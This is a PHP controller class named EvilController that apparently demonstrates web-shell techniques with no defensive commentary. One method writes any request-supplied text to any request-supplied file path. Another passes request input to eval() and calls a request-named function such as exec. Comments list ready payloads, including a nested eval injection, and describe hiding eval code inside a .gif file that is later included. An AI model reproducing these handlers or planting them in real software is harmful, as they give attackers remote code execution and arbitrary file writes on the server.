<?php
namespace Codelib\Controller;

class EvilController 
{
    public function __construct()
    {
        //echo 'init evil';
    }

    public function index()
    {
        echo 'index';
    }

    public function paramAttack()
    {
        $this->_writeFile();
    }

    protected function _writeFile()
    {
        header("Content-Type: text/html;charset=utf-8");
        if (get_magic_quotes_gpc()) { // get_magic_quotes_gpc() is return false forever from php 5.4.0
            foreach($_GET as $key => $value) {
                $_GET[$key] = stripslashes($value);
            }
        }

        $file = str_replace('\\', '/', __FILE__);
        $formString = "<form method='GET'>"
            . "保存文件名: <input type='text' name='file' size='60' value='{$file}'><br><br>"
            . "<textarea name='text' COLS='70' ROWS='18' ></textarea><br><br>"
            . "<input type='submit' name='submit' value='保存'>"
            . "<form>";
        echo $formString;

        if (isset($_GET['file'])) {
           $fp = @fopen($_GET['file'], 'wb');
           echo @fwrite($fp, $_GET['text']) ? '保存成功!' : '保存失败!';
           @fclose($fp);
        }
        exit();
    }

    protected function evalAttack()
    {
        $_POST = $_GET; // for test, i.e: attack=phpinfo(); attack=${${phpinfo()}};  attack=${${eval($_GET['d'])}};&d=phpinfo();
        // attack 1
        $result = @eval($_POST['attack']); // This is wrong: $command = 'eval'; $command();

        // attack 2
        // include('logo1.gif');
        // content of logo1.gif: ? >? >? >< ? php eval($_POST['attack']);die; ? >

        // attack 3 exec=dir or exec=ls
        $command = (string) key($_POST);
        $result = $command($_POST[$command]);
        var_dump($result);
    }
}
